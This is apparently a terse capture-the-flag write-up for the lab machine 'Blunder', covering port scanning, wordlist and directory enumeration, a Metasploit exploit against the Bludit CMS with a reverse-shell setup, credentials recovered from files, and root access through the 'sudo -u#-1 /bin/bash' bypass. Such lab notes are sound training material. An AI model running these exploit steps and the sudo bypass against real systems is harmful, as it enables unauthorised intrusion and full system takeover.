# Blunder
```
export_ip = 10.10.10.191
```


##[Reconnissance]
***Gather iniial information***
```
PORT
-- 21 not open ftp
-- 80 http open
```

## Enumeratinon HTTP
```
Accessable Hidden Path 
- Tool : gobuster
- Result : goBusterResult.txt

--> USER ID : todo.txt
--> USER PASSWORD 
- Tool : cewl -d 5 {export_ip}
--> admin page exposure : /admin

PoC Code : PoC.py
```

## Exploit
```
Tool : Metasploit
- search bludit
- user {bludit_result}
-- set BLUDITUSER fergus
-- set BLUDITPASS RolandDes**
-- set LHOST
-- set LPORT
-- set RHOST
-- exploit 

```

## Priviliege Escalte Process
```
: USER 
: /var/www/bludit-3.10.0a/bl-content/databases/users.php
: hugo,Password120

: sudo -l
-- /bin/bash
: sudo -u#-1 /bin/bash
```